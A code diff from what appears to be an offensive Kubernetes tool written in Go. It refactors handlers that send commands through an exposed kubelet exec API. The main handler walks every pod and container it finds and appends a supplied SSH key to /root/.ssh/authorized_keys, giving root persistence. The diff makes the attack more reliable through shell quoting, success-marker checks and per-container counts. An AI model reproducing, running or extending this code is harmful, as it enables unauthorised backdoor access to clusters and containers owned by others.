@@ -5,7 +5,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	neturl "net/url"
 	"strings"
 
 	"github.com/gin-gonic/gin"
@@ -238,7 +237,7 @@ func (h *AccessHandler) KubeletExec(c *gin.Context) {
 	if req.ContainerName != "" {
 		url += "/" + req.ContainerName
 	}
-	code, body, err := util.SendPost(url, "cmd="+req.Command,
+	code, body, err := util.SendPost(url, encodeKubeletCommandForm(req.Command),
 		"application/x-www-form-urlencoded", req.Token, req.TimeoutSec, req.SkipTLS)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"status_code": code, "error": err.Error()})
@@ -480,38 +479,16 @@ func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
 		return
 	}
 
-	// Proper JSON parsing of Kubelet /pods response
-	type kubeletContainer struct {
-		Name string `json:"name"`
-	}
-	type kubeletPodSpec struct {
-		Containers []kubeletContainer `json:"containers"`
-	}
-	type kubeletPodMeta struct {
-		Name      string `json:"name"`
-		Namespace string `json:"namespace"`
-	}
-	type kubeletPod struct {
-		Metadata kubeletPodMeta `json:"metadata"`
-		Spec     kubeletPodSpec `json:"spec"`
-	}
-	type kubeletPodList struct {
-		Items []kubeletPod `json:"items"`
-	}
-
-	var podList kubeletPodList
-	if err := json.Unmarshal(body, &podList); err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": "Failed to parse pod list: " + err.Error()})
-		return
-	}
-
-	if len(podList.Items) == 0 {
-		c.JSON(http.StatusOK, gin.H{"error": "No pods found"})
+	items, err := parseKubeletPodList(body)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
 		return
 	}
 
 	results := []gin.H{}
-	for _, pod := range podList.Items {
+	successCount := 0
+	quotedKey := shellQuoteSingle(strings.TrimSpace(req.SSHKey))
+	for _, pod := range items {
 		ns := pod.Metadata.Namespace
 		if ns == "" {
 			ns = "default"
@@ -527,37 +504,47 @@ func (h *AccessHandler) KubeletSSHInject(c *gin.Context) {
 				execUrl += "/" + c.Name
 			}
 
-			sshCmd := fmt.Sprintf("mkdir -p /root/.ssh 2>/dev/null && echo '%s' >> /root/.ssh/authorized_keys 2>/dev/null && chmod 600 /root/.ssh/authorized_keys 2>/dev/null && echo 'SSH_KEY_INJECTED' || echo 'FAILED'",
-				req.SSHKey)
-			form := neturl.Values{"cmd": []string{sshCmd}}
-			ec, eb, execErr := util.SendPost(execUrl, form.Encode(), "application/x-www-form-urlencoded", "", req.TimeoutSec, req.SkipTLS)
+			sshCmd := fmt.Sprintf("mkdir -p /root/.ssh 2>/dev/null && printf '%%s\\n' %s >> /root/.ssh/authorized_keys 2>/dev/null && chmod 600 /root/.ssh/authorized_keys 2>/dev/null && echo 'SSH_KEY_INJECTED' || echo 'FAILED'",
+				quotedKey)
+			ec, eb, execErr := util.SendPost(execUrl, encodeKubeletCommandForm(sshCmd), "application/x-www-form-urlencoded", "", req.TimeoutSec, req.SkipTLS)
 
 			result := gin.H{
 				"namespace": ns,
 				"pod":       podName,
 				"container": c.Name,
 			}
-			if execErr == nil && ec == 200 {
+			output := strings.TrimSpace(string(eb))
+			if output != "" {
+				result["output"] = output
+			}
+			if kubeletExecHasMarker(ec, eb, execErr, "SSH_KEY_INJECTED") {
 				result["status"] = "injected"
-				result["output"] = strings.TrimSpace(string(eb))
+				successCount++
 			} else {
 				result["status"] = "failed"
 				if execErr != nil {
 					result["error"] = execErr.Error()
-				} else {
+				} else if ec != 200 {
 					result["error"] = fmt.Sprintf("HTTP %d", ec)
+				} else if output != "" {
+					result["error"] = "command did not confirm SSH key injection"
+				} else {
+					result["error"] = "empty kubelet exec response"
 				}
 			}
 			results = append(results, result)
 		}
 	}
 
-	sshCmd := fmt.Sprintf("ssh -i ~/.ssh/id_rsa root@%s", req.TargetHost)
 	c.JSON(http.StatusOK, gin.H{
-		"results":        results,
-		"pods_attempted": len(results),
-		"ssh_command":    sshCmd,
-		"note":           fmt.Sprintf("SSH key injected into %d containers. Connect: %s", len(results), sshCmd),
+		"results":              results,
+		"pods_discovered":      len(items),
+		"pods_attempted":       len(items),
+		"containers_attempted": len(results),
+		"success_count":        successCount,
+		"failed_count":         len(results) - successCount,
+		"connection_hint":      "密钥已写入容器文件系统。只有目标容器本身运行 sshd，或该路径最终落到宿主机/可达目标时，SSH 连接提示才真正成立。",
+		"note":                 fmt.Sprintf("Discovered %d pods and attempted SSH key injection in %d containers; successful writes: %d.", len(items), len(results), successCount),
 	})
 }
 
